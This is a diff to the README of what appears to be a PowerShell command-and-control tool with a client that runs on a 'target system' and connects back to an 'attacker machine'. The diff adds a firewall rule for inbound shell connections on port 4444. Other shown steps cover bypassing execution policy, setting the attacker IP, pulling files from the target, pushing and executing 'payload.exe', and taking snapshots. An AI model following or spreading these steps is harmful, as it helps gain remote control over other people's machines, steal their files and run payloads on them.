@@ -100,11 +100,8 @@ This project follows a **client-controller model**:
 
 ### Steps
 
-```powershell id="c2x8kp"
-# Allow script execution (temporary)
+```powershell id="fwk2pz"
 Set-ExecutionPolicy Bypass -Scope Process
-
-# Run the script
 .\client.ps1
 ```
 
@@ -112,9 +109,9 @@ Set-ExecutionPolicy Bypass -Scope Process
 
 ## 🔧 Configuration
 
-Before running the client, configure the connection settings:
+### Connection Settings
 
-```powershell id="8z4qtm"
+```powershell id="z3lm8x"
 $AttackerIP = "<CONTROLLER_IP>"
 $AttackerPort = 4444
 ```
@@ -123,6 +120,27 @@ $AttackerPort = 4444
 | -------------- | ------------------------------------ |
 | `AttackerIP`   | IP address of the controller machine |
 | `AttackerPort` | Port used for communication          |
+
+---
+
+### 🔥 Firewall – “Opening the Portal”
+
+Before anything works, the controller must be able to receive incoming connections.
+
+#### ⚙️ Rule Setup & Verification (Windows)
+
+```powershell id="8nyxq1"
+New-NetFirewallRule -DisplayName "AWK-C2-Inbound" `
+    -Description "Allows AWK Master Controller to receive Shell connections" `
+    -Direction Inbound `
+    -LocalPort 4444 `
+    -Protocol TCP `
+    -Action Allow `
+    -Profile Any `
+    -EdgeTraversalPolicy Allow
+
+Get-NetFirewallRule -DisplayName "AWK-C2-Inbound" | Select-Object DisplayName, Enabled, Profile, Direction, Action
+```
 
 ---
 
@@ -144,17 +162,16 @@ Responsibilities:
   * Files (Base64 encoded)
   * Snapshots
 
-> ℹ️ Firewall and network configuration should be handled separately.
-
 ---
 
 ## 🚀 Usage
 
 1. Start the **master controller** on attacker machine
 2. Configure connection settings in client script
-3. Run the client on the target system
-4. Wait for connection
-5. Send commands from controller
+3. Ensure firewall rule is applied
+4. Run the client on the target system
+5. Wait for connection
+6. Send commands from controller
 
 ---
 
@@ -229,25 +246,25 @@ Responsibilities:
 
 ### 📥 Pull File
 
-```text id="m1v7za"
+```text id="x4vd2p"
 pull report.pdf
 ```
 
 ### 📤 Push File
 
-```text id="p8x2wr"
+```text id="q9t7el"
 push C:\Users\User\Desktop\payload.exe
 ```
 
 ### 📸 Take Snapshot
 
-```text id="z6k9dn"
+```text id="u8gm1s"
 snap
 ```
 
 ### ⚙️ Execute File
 
-```text id="r4q1ty"
+```text id="j3l9kc"
 exec payload.exe
 ```
 
